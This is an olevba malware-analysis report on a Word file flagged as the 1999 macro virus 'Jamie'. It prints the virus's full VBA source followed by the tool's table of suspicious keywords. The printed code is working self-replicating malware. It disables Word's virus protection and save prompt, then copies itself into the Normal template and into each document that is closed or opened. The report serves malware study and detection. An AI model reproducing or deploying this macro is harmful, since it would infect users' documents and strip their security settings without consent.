olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jamie-942a0f193af4cc8067a8f1e4d9998473c69ceafd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jamie-942a0f193af4cc8067a8f1e4d9998473c69ceafd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
If ActiveDocument.VBProject.Description <> "For Jamie..." Then GoTo ADI
If NormalTemplate.VBProject.Description <> "For Jamie..." Then GoTo NTI
End
ADI:
Set MTI = AD
Set MTC = NT
OPM = "Private Sub Document_Close()"
AII = AD.CodeModule.CountOfLines
ActiveDocument.VBProject.Description = "For Jamie..."
GoTo Install
NTI:
Set MTI = NT
Set MTC = AD
OPM = "Private Sub Document_Open()"
AII = NT.CodeModule.CountOfLines
NormalTemplate.VBProject.Description = "For Jamie..."
GoTo Install
Install:
If AII > 0 Then
 With MTI.CodeModule
  For x = x To AII
  .DeleteLines 1
  Next
 End With
End If
If AII >= 0 Then
 MTC.Export ("Jamie.tmp")
 MTI.CodeModule.AddFromFile ("Jamie.tmp")
  With MTI.CodeModule
   For x = x To 3
   .DeleteLines 1
   Next
   .ReplaceLine 1, OPM
  End With
 Kill ("Jamie.tmp")
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
',.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,
' Jamie(Type A - Strand A) By Lys KovicK
' Released: Friday, May 21, 1999, 15:40
'';';';';';';';';';';';';';';';';';';';';'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

